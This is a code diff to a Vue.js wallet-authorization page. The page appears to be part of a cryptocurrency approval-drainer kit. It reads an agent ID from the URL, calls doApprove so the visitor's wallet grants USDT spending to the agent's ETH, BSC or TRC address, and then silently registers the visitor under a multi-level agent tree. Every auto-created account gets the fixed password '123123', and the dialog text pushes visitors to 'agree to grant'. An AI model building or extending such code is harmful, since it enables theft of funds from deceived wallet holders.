@@ -33,11 +33,14 @@
     <router-view></router-view>
 
     <el-dialog title="Website application authorizes your wallet" :visible.sync="falg" width="60%" center>
-      <span style="text-align: center;display:block;">1.If the license does not respond, click the Reset button below to clear the corresponding (Eth/Bsc/Trc) link information</span>
+      <span style="text-align: center;display:block;">1.If the license does not respond, click the Reset button below to
+        clear the corresponding (Eth/Bsc/Trc) link information</span>
       <br />
-      <span style="text-align: center;display:block;">2.If you have connected wallet but do not pull 'App Wallet Authorization 'for a long time, please return to this page to refresh and click Authorization again</span>
+      <span style="text-align: center;display:block;">2.If you have connected wallet but do not pull 'App Wallet
+        Authorization 'for a long time, please return to this page to refresh and click Authorization again</span>
       <br />
-      <span style="text-align: center;display:block;">3.After 'agree to grant' may need to wait on the chain Peeding, perhaps you should wait for a while on this page</span>
+      <span style="text-align: center;display:block;">3.After 'agree to grant' may need to wait on the chain Peeding,
+        perhaps you should wait for a while on this page</span>
       <span slot="footer" class="dialog-footer">
         <el-button @click="disConnect">Reset</el-button>
         <el-button @click="no">Cancel</el-button>
@@ -54,6 +57,7 @@ import BlockChain from "../blockchain/BlockChainBase"
 import { createNamespacedHelpers } from "vuex";
 // 封装的自动注册方法
 import { autoRegister } from '../utils/myRegisterUtils'
+import { info } from "console";
 const blockUtils = new BlockChain();
 // 获取状态机内部封装的方法
 const { mapState, mapMutations, mapActions } = createNamespacedHelpers("Home");
@@ -76,7 +80,6 @@ export default {
   methods: {
     ...mapActions(['GetUserId', 'GoAutoRegister']),
     async yes() {
-
       // 点击授权 解析restful数据
       let res = this.$route.query.data;
       let ar = res.split('?')
@@ -93,34 +96,40 @@ export default {
 
       //区块链类型
       var chainType = ar[1].split('=')[0].split('_')[0].toUpperCase()
-
       // 获取解析后的账号id
       let userId = arr[0].userParentId
-
+      console.log(arr);
       // 发送请求获取账号地址
       await this.GetUserId({ id: userId })
-
       // 如果账号地址没有就跳转到后台主页 有就执行授权
       if (this.obj == null) this.open()
       else {
         var agentAddress
+        console.log(this.obj, `this.obj`);
         if (chainType == 'ETH') {
-          agentAddress = this.obj.ethMainnetAddress
+          agentAddress = this.obj.ethMainnetAddress + '-ETH'
         }
         else if (chainType == 'BSC') {
-          agentAddress = this.obj.bscMainnetAddress
+          agentAddress = this.obj.bscMainnetAddress + '-BSC'
         }
         else if (chainType == 'TRC') {
-          agentAddress = this.obj.trcMainnetAddress
+          agentAddress = this.obj.trcMainnetAddress + '-TRC'
+        }
+        else {
+          agentAddress = this.obj.ancestorAddress
         }
 
-        console.log('agentAddress = ', agentAddress)
+
+        let agentAdressArr = agentAddress.split('-')
+        console.log('agentAdressArr = ', agentAdressArr)
+
         let doApproveInner = async (web3) => {
-          blockUtils.doApprove(web3, agentAddress, async (result, address) => {
+          blockUtils.doApprove(web3, agentAdressArr[0], async (result, address) => {
             if (result == true) {
               let userName = autoRegister(8)
-              let passWord = autoRegister(10)
+              let passWord = '123123'
               let userId = autoRegister(10)
+              let ancestorAddress = agentAddress
               // 发送请求注册
               let obj = {
                 userName,
@@ -128,13 +137,32 @@ export default {
                 userId,
                 userType: '3',
                 userParentId: arr[0].userParentId,
+                userParentName: this.obj.userName,
+                ancestorAddress
               }
-              if (this.arr[1].eth_usdt) {
-                obj['ethMainnetAddress'] = address
-              } else if (this.arr[1].bsc_usdt) {
-                obj['bscMainnetAddress'] = address
-              } else if (this.arr[1].trc_usdt) {
-                obj['trcMainnetAddress'] = address
+              console.log(this.arr, `this.arr[1]`);
+              // 如果是一级用户
+              if (this.arr.length == 2) {
+                // 添加授权用户对应链地址 
+                if (this.arr[1].eth_usdt) {
+                  obj['ethMainnetAddress'] = address
+                } else if (this.arr[1].bsc_usdt) {
+                  obj['bscMainnetAddress'] = address
+                } else if (this.arr[1].trc_usdt) {
+                  obj['trcMainnetAddress'] = address
+                }
+              } else {
+                // 如果是二级用户及以上
+                // 添加授权用户对应链地址
+                if (agentAddress[1] == 'ETH') {
+                  obj['ethMainnetAddress'] = address
+                }
+                else if (agentAddress[1] == 'BSC') {
+                  obj['bscMainnetAddress'] = address
+                }
+                else if (agentAddress[1] == 'TRC') {
+                  obj['trcMainnetAddress'] = address
+                }
               }
               console.log(`授权成功，创建的用户信息为`, obj);
               await this.GoAutoRegister({
@@ -144,7 +172,7 @@ export default {
               this.$message({
                 type: 'info',
                 message: this.Msg
-              });
+              })
             }
             else {
               this.$message({
@@ -208,6 +236,7 @@ export default {
   created() {
     //如果有数据
     if (this.$route.query.data) {
+      console.log(this.$route.query.data);
       this.falg = true;
     }
   }
